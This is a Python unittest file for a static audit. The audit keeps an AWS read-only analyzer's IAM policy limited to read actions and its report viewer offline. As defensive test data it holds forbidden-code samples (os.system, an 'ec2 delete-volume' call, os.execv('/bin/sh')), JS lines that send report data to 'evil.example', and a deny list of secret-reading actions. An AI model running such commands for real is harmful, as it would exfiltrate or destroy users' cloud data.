"""The static audit must pass on the real code and catch deliberate violations."""

import tempfile
import textwrap
import unittest
from pathlib import Path

from analyzer import allowlist, audit, policy, vendor

WRITE_VERBS = ("Create", "Delete", "Put", "Update", "Modify", "Terminate", "Stop", "Start",
               "Run", "Attach", "Detach", "Release", "Allocate", "Associate", "Disassociate",
               "Invoke", "Publish", "Send", "Purge", "Reboot", "Authorize", "Revoke", "Register",
               "Deregister", "Import", "Enable", "Disable", "Tag", "Untag", "Set", "Change",
               "Assume", "Decrypt", "Encrypt", "Generate", "Reset")


def make_pkg(files: dict[str, str]) -> Path:
    root = Path(tempfile.mkdtemp()) / "pkg"
    root.mkdir()
    for name, body in files.items():
        (root / name).write_text(textwrap.dedent(body))
    return root


class TestRealCodebase(unittest.TestCase):
    def test_audit_passes(self):
        rep = audit.run_audit()
        self.assertEqual(rep.violations, [], "\n".join(rep.violations))

    def test_policy_has_only_read_actions(self):
        for kwargs in ({}, {"include_cost": True}):
            pol = policy.build_policy(**kwargs)
            for action in policy.all_actions(pol):
                svc, name = action.split(":")
                self.assertRegex(action, r"^[a-z0-9]+:[A-Za-z]+$")
                self.assertFalse(name.startswith(WRITE_VERBS), action)
                self.assertTrue(name.startswith(("Describe", "List", "Get", "BatchGet")) or action == "apigateway:GET",
                                action)
            self.assertTrue(all(st["Effect"] == "Allow" for st in pol["Statement"]))

    def test_apigateway_get_is_scoped_to_the_list_paths_only(self):
        """apigateway:GET on '*' would allow reading API key values and stage variables."""
        pol = policy.build_policy(include_cost=True)
        for st in pol["Statement"]:
            if "apigateway:GET" in st["Action"]:
                self.assertNotEqual(st["Resource"], "*")
                self.assertEqual(sorted(st["Resource"]), ["arn:aws:apigateway:*::/apis", "arn:aws:apigateway:*::/restapis"])
        self.assertNotIn("apigateway:GET", pol["Statement"][0]["Action"])

    def test_policy_fits_managed_policy_limit(self):
        self.assertLessEqual(policy.policy_size(policy.build_policy(include_cost=True)),
                             policy.IAM_MANAGED_POLICY_LIMIT)

    def test_policy_excludes_sensitive_actions(self):
        actions = set(policy.build_policy(include_cost=True)["Statement"][0]["Action"])
        for bad in ("s3:GetObject", "dynamodb:Scan", "dynamodb:GetItem", "secretsmanager:GetSecretValue",
                    "ssm:GetParameter", "lambda:GetFunction", "ecr:GetAuthorizationToken", "kms:Decrypt"):
            self.assertNotIn(bad, actions)

    def test_cost_group_is_optional(self):
        base = set(policy.build_policy()["Statement"][0]["Action"])
        self.assertNotIn("ce:GetCostAndUsage", base)
        self.assertIn("ce:GetCostAndUsage", policy.build_policy(include_cost=True)["Statement"][0]["Action"])

    def test_committed_policy_files_are_in_sync(self):
        """config/readonly-policy*.json must be regenerated when the allowlist changes."""
        cfg = audit.ROOT / "config"
        for fname, kwargs in (("readonly-policy.json", {}), ("readonly-policy-with-cost.json", {"include_cost": True})):
            path = cfg / fname
            self.assertTrue(path.exists(), f"missing {path}; run: python3 -m analyzer policy > config/{fname}")
            self.assertEqual(path.read_text(), policy.render(policy.build_policy(**kwargs)),
                             f"{fname} is stale; regenerate with python3 -m analyzer policy")


class TestAuditCatchesViolations(unittest.TestCase):
    def violations(self, **files):
        return audit.run_audit(make_pkg(files), viewer_dir=Path("/nonexistent")).violations

    def test_subprocess_import_outside_chokepoint(self):
        v = self.violations(**{"evil.py": "import subprocess\nsubprocess.run(['aws','ec2','delete-volume'])\n"})
        self.assertTrue(any("forbidden import 'subprocess'" in x for x in v), v)

    def test_from_subprocess_import(self):
        v = self.violations(**{"evil.py": "from subprocess import run\n"})
        self.assertTrue(any("forbidden import from 'subprocess'" in x for x in v), v)

    def test_boto3_import(self):
        v = self.violations(**{"evil.py": "import boto3\n"})
        self.assertTrue(any("boto3" in x for x in v), v)

    def test_os_system(self):
        v = self.violations(**{"evil.py": "import os\nos.system('aws ec2 delete-volume')\n"})
        self.assertTrue(any("os.system" in x for x in v), v)

    def test_os_popen_and_exec(self):
        v = self.violations(**{"evil.py": "import os\nos.popen('x')\nos.execv('/bin/sh', [])\n"})
        self.assertEqual(len(v), 2, v)

    def test_eval_and_dunder_import(self):
        v = self.violations(**{"evil.py": "eval('1')\n__import__('subprocess')\n"})
        self.assertEqual(len(v), 2, v)

    def test_write_call_via_ctx(self):
        v = self.violations(**{"c.py": "def f(ctx):\n    ctx.aws('ec2', 'delete-volume', ['--volume-id', 'v'])\n"})
        self.assertTrue(any("not a read verb" in x for x in v), v)

    def test_unlisted_read_call(self):
        v = self.violations(**{"c.py": "def f(ctx):\n    ctx.aws('ec2', 'describe-instance-attribute')\n"})
        self.assertTrue(any("not in the allowlist" in x for x in v), v)

    def test_non_literal_call(self):
        v = self.violations(**{"c.py": "def f(ctx, op):\n    ctx.aws('ec2', op)\n"})
        self.assertTrue(any("string literals" in x for x in v), v)

    def test_clean_module_passes(self):
        v = self.violations(**{"c.py": "def f(ctx):\n    return ctx.aws('ec2', 'describe-addresses')\n"})
        self.assertEqual(v, [])


class TestViewerOffline(unittest.TestCase):
    def test_viewer_network_primitives_are_flagged(self):
        d = Path(tempfile.mkdtemp())
        (d / "app.js").write_text("fetch('https://example.com/x')\n")
        (d / "index.html").write_text('<script src="https://cdn.example.com/x.js"></script>')
        rep = audit.AuditReport()
        audit.audit_viewer(rep, d)
        self.assertTrue(any("app.js: viewer uses fetch()" in v for v in rep.violations), rep.violations)
        self.assertTrue(any("index.html: viewer uses remote resource" in v for v in rep.violations), rep.violations)

    def test_viewer_navigation_sinks_are_flagged(self):
        """No CSP directive blocks a top-level navigation, so a URL carrying report data must never be opened."""
        cases = {
            "a.js": "location.href = 'x?d=' + encodeURIComponent(JSON.stringify(AWSA.data));",
            "b.js": "window.location='x'+d;",
            "c.js": "location.assign(u);",
            "d.js": "location.replace(u);",
            "e.js": "window.open(u);",
            "f.js": "AWSA.h('a', { href: 'https://evil.example/?' + x }).click();",
            "g.js": "const u = `http://evil.example/${x}`;",
            "h.css": ".x { background: url(https://evil.example/p.png) }",
        }
        for name, body in cases.items():
            d = Path(tempfile.mkdtemp())
            (d / name).write_text(body + "\n")
            rep = audit.AuditReport()
            audit.audit_viewer(rep, d)
            self.assertTrue(rep.violations, f"{name} should be flagged: {body}")

    def test_viewer_benign_lookalikes_pass(self):
        d = Path(tempfile.mkdtemp())
        (d / "ok.js").write_text("\n".join([
            "const SVG_NS = 'http://www.w3.org/2000/svg';",
            "const raw = location.hash.replace(/^#/, '');",
            "if (location.hash === '#x') A.drawer.open(key);",
            "history.replaceState(null, '', hash);",
            "const self = this; self.goal.x += 1;",
            "h('details', { open: true }, h('summary', null, 'x'));",
            "this.canvas = document.createElement('canvas');",
            "p.setAttribute('marker-end', 'url(#arr)');",
        ]) + "\n")
        # the one local download link (a blob: URL) is allowed, as these exact lines in util.js only
        (d / "js").mkdir()
        (d / "js" / "util.js").write_text("    const a = document.createElement('a');\n    a.setAttribute('href', url);\n")
        rep = audit.AuditReport()
        audit.audit_viewer(rep, d)
        self.assertEqual(rep.violations, [])

    def test_pinned_vendor_file_is_exempt(self):
        d = Path(tempfile.mkdtemp())
        (d / "vendor").mkdir()
        (d / "vendor" / "lib.js").write_text("function f(){ return new XMLHttpRequest() }")
        (d / "vendor" / "README.md").write_text("docs")
        rep = audit.AuditReport()
        audit.audit_viewer(rep, d, pins={"lib.js": vendor.sha256(d / "vendor" / "lib.js"), "README.md": None})
        self.assertEqual(rep.violations, [])

    def test_unpinned_or_modified_vendor_file_is_flagged(self):
        d = Path(tempfile.mkdtemp())
        (d / "vendor").mkdir()
        (d / "vendor" / "lib.js").write_text("function f(){ return 1 }")
        (d / "vendor" / "extra.js").write_text("fetch('https://evil.example')")
        (d / "vendor" / "notes.js").write_text("// unpinned code dressed as docs")
        rep = audit.AuditReport()
        audit.audit_viewer(rep, d, pins={"lib.js": "0" * 64, "notes.js": None})
        self.assertEqual(len(rep.violations), 3, rep.violations)
        self.assertTrue(any("does not match" in v for v in rep.violations))
        self.assertTrue(any("not pinned" in v for v in rep.violations))
        self.assertTrue(any("unpinned code" in v for v in rep.violations))

    def test_real_vendor_folder_is_pinned(self):
        rep = audit.AuditReport()
        audit.audit_viewer(rep)
        self.assertEqual(rep.violations, [])


if __name__ == "__main__":
    unittest.main()
